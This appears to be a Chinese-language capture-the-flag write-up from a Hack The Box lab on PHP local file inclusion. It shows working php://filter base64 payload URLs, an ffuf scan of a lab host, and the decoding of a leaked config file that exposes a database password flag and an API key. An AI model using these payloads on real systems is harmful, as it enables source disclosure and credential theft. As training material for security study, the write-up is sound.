+<h2 id="标准PHP包含"><a href="#标准PHP包含" class="headerlink" title="标准PHP包含"></a>标准PHP包含</h2><p>在前面的小节中，如果您试图通过LFI包含任何php文件，您会注意到包含的php文件会被执行，并最终被呈现为普通的HTML页面。例如，让我们尝试包含config.php页面（web应用程序附加的.php扩展名）：</p>
+<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=config</code></p>
+<p>正如我们所看到的，我们得到了一个空的结果来代替LFI字符串，因为config.php很可能只设置web应用程序配置，而不呈现任何HTML输出。<br>这在某些情况下可能很有用，比如访问我们无法访问的本地PHP页面（即SSRF），但在大多数情况下，我们更感兴趣的是通过LFI阅读PHP源代码，因为源代码往往会揭示有关web应用程序的重要信息。这就是base64 php过滤器变得有用的地方，因为我们可以使用它对php文件进行base64编码，然后我们将获得编码的源代码，而不是执行和渲染它。这对于我们处理带有附加PHP扩展的LFI的情况尤其有用，因为我们可能被限制为仅包括PHP文件，如前一节所述。</p>
+<h2 id="代码泄露-Source-Code-Disclosure"><a href="#代码泄露-Source-Code-Disclosure" class="headerlink" title="代码泄露-Source Code Disclosure"></a>代码泄露-Source Code Disclosure</h2><p>一旦我们有了想要读取的潜在PHP文件的列表，我们就可以开始使用base64 PHP过滤器公开它们的来源。让我们尝试使用base64过滤器读取config.php的源代码，方法是为read参数指定convert.base64-encode，为resource参数指定config，如下所示：</p>
+<pre><code>php://filter/read=convert.base64-encode/resource=config
+</code></pre>
+<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=config</code></p>
+<p>正如我们所看到的，与我们使用常规LFI的尝试不同，使用base64过滤器返回了一个编码的字符串，而不是我们之前看到的空结果。我们现在可以对这个字符串进行解码，以获得config.php源代码的内容，如下所示：</p>
+<pre><code>echo &#39;PD9waHAK...SNIP...KICB9Ciov&#39; | base64 -d
+
+...SNIP...
+
+if ($_SERVER[&#39;REQUEST_METHOD&#39;] == &#39;GET&#39; &amp;&amp; realpath(__FILE__) == realpath($_SERVER[&#39;SCRIPT_FILENAME&#39;])) &#123;
+  header(&#39;HTTP/1.0 403 Forbidden&#39;, TRUE, 403);
+  die(header(&#39;location: /index.php&#39;));
+&#125;
+
+...SNIP...
+</code></pre>
+<h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><pre><code>target:178.62.18.68:32380
+</code></pre>
+<ul>
+<li>为其他php脚本模糊web应用程序，然后读取其中一个配置文件并提交数据库密码作为答案</li>
+</ul>
+<p>kali扫一扫：</p>
+<pre><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://178.62.18.68:32380/FUZZ -e .php -recursion -recursion-depth 1 -v  -t 80 | grep URL
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://178.62.18.68:32380/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Extensions       : .php 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 80
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+| URL | http://178.62.18.68:32380/#
+| URL | http://178.62.18.68:32380/# Copyright 2007 James Fisher
+| URL | http://178.62.18.68:32380/# on at least 3 different hosts.php
+| URL | http://178.62.18.68:32380/#.php
+| URL | http://178.62.18.68:32380/# license, visit http://creativecommons.org/licenses/by-sa/3.0/
+| URL | http://178.62.18.68:32380/# Attribution-Share Alike 3.0 License. To view a copy of this
+| URL | http://178.62.18.68:32380/# Attribution-Share Alike 3.0 License. To view a copy of this.php
+| URL | http://178.62.18.68:32380/# license, visit http://creativecommons.org/licenses/by-sa/3.0/.php
+| URL | http://178.62.18.68:32380/# or send a letter to Creative Commons, 171 Second Street,
+| URL | http://178.62.18.68:32380/index.php
+| URL | http://178.62.18.68:32380/#.php
+| URL | http://178.62.18.68:32380/#
+| URL | http://178.62.18.68:32380/#
+| URL | http://178.62.18.68:32380/# directory-list-2.3-small.txt
+| URL | http://178.62.18.68:32380/# or send a letter to Creative Commons, 171 Second Street,.php
+| URL | http://178.62.18.68:32380/#.php
+| URL | http://178.62.18.68:32380/# This work is licensed under the Creative Commons
+| URL | http://178.62.18.68:32380/# Copyright 2007 James Fisher.php
+| URL | http://178.62.18.68:32380/#.php
+| URL | http://178.62.18.68:32380/
+| URL | http://178.62.18.68:32380/# Suite 300, San Francisco, California, 94105, USA.
+| URL | http://178.62.18.68:32380/# Priority-ordered case-sensitive list, where entries were found
+| URL | http://178.62.18.68:32380/# This work is licensed under the Creative Commons.php
+| URL | http://178.62.18.68:32380/.php
+| URL | http://178.62.18.68:32380/# Priority-ordered case-sensitive list, where entries were found.php
+| URL | http://178.62.18.68:32380/#
+| URL | http://178.62.18.68:32380/# directory-list-2.3-small.txt.php
+| URL | http://178.62.18.68:32380/# Suite 300, San Francisco, California, 94105, USA..php
+| URL | http://178.62.18.68:32380/# on at least 3 different hosts
+| URL | http://178.62.18.68:32380/en.php
+| URL | http://178.62.18.68:32380/es.php
+| URL | http://178.62.18.68:32380/configure.php
+</code></pre>
+<p>到这里先扫到一个configure.php，try一try：</p>
+<pre><code>http://178.62.18.68:32380/index.php?language=php://filter/read=convert.base64-encode/resource=configure
+</code></pre>
+<p>读到了：</p>
+<pre><code>         PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0+ICdibG9nZGInCik7CgokQVBJX0tFWSA9ICJBd2V3MjQyR0RzaHJmNDYrMzUvayI7            
+</code></pre>
+<p>解码一下：</p>
+<pre><code>echo PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0+ICdibG9nZGInCik7CgokQVBJX0tFWSA9ICJBd2V3MjQyR0RzaHJmNDYrMzUvayI7 | base64 -d    
+&lt;?php
+
+if ($_SERVER[&#39;REQUEST_METHOD&#39;] == &#39;GET&#39; &amp;&amp; realpath(__FILE__) == realpath($_SERVER[&#39;SCRIPT_FILENAME&#39;])) &#123;
+  header(&#39;HTTP/1.0 403 Forbidden&#39;, TRUE, 403);
+  die(header(&#39;location: /index.php&#39;));
+&#125;
+
+$config = array(
+  &#39;DB_HOST&#39; =&gt; &#39;db.inlanefreight.local&#39;,
+  &#39;DB_USERNAME&#39; =&gt; &#39;root&#39;,
+  &#39;DB_PASSWORD&#39; =&gt; &#39;HTB&#123;n3v3r_$t0r3_pl4!nt3xt_cr3d$&#125;&#39;,
+  &#39;DB_DATABASE&#39; =&gt; &#39;blogdb&#39;
+);
+
+$API_KEY = &quot;Awew242GDshrf46+35/k&quot;;   
+</code></pre>
+<p>HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}</p>
+
     </div>
 
     
